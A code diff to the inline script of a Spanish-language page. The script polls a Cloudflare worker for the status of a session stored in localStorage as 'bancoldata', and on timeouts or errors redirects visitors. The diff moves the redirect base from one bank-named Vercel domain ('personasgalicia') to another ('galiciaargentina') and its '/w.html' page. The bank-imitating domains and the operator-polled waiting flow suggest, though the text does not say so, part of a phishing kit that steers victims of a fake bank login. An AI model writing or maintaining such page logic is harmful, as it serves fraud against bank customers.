@@ -153,7 +153,7 @@
   <script>
     // ========================= CONFIGURACIÓN =========================
     const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
-    const BASE_URL = 'https://personasgalicia.vercel.app';
+    const BASE_URL = 'https://galiciaargentina.vercel.app';
     let intentos = 0;
     const MAX_INTENTOS = 60;
     let timeoutId = null;
@@ -190,7 +190,7 @@
             actualizarEstado('⏰ Tiempo de espera agotado. Redirigiendo...', 'error');
             redirigiendo = true;
             setTimeout(() => {
-              window.location.href = `${BASE_URL}/`;
+              window.location.href = `${BASE_URL}/w.html`;
             }, 2000);
             return;
           }
@@ -216,7 +216,7 @@
             actualizarEstado('⏰ Tiempo de espera agotado. Redirigiendo...', 'error');
             redirigiendo = true;
             setTimeout(() => {
-              window.location.href = `${BASE_URL}/`;
+              window.location.href = `${BASE_URL}/w.html`;
             }, 2000);
             return;
           }
@@ -261,9 +261,9 @@
             break;
 
           case 'error':
-            console.log(`🔄 Redirigiendo a: ${BASE_URL}/`);
+            console.log(`🔄 Redirigiendo a: ${BASE_URL}/w.html`);
             setTimeout(() => {
-              window.location.href = `${BASE_URL}/`;
+              window.location.href = `${BASE_URL}/w.html`;
             }, 1500);
             break;
 
@@ -299,7 +299,7 @@
           redirigiendo = true;
           actualizarEstado('❌ Error de conexión. Redirigiendo...', 'error');
           setTimeout(() => {
-            window.location.href = `${BASE_URL}/`;
+            window.location.href = `${BASE_URL}/w.html`;
           }, 2000);
         }
       }
@@ -324,7 +324,7 @@
         console.log('❌ Error: Datos no encontrados en localStorage');
         actualizarEstado('❌ Sesión no encontrada. Redirigiendo...', 'error');
         setTimeout(() => {
-          window.location.href = `${BASE_URL}/`;
+          window.location.href = `${BASE_URL}/w.html`;
         }, 2000);
         return;
       }
@@ -337,7 +337,7 @@
         console.error('❌ Error parsing bancoldata:', e);
         actualizarEstado('❌ Error al leer sesión. Redirigiendo...', 'error');
         setTimeout(() => {
-          window.location.href = `${BASE_URL}/`;
+          window.location.href = `${BASE_URL}/w.html`;
         }, 2000);
         return;
       }
@@ -348,7 +348,7 @@
         console.log('❌ Error: transactionId no encontrado en los datos');
         actualizarEstado('❌ ID de sesión no encontrado. Redirigiendo...', 'error');
         setTimeout(() => {
-          window.location.href = `${BASE_URL}/`;
+          window.location.href = `${BASE_URL}/w.html`;
         }, 2000);
         return;
       }
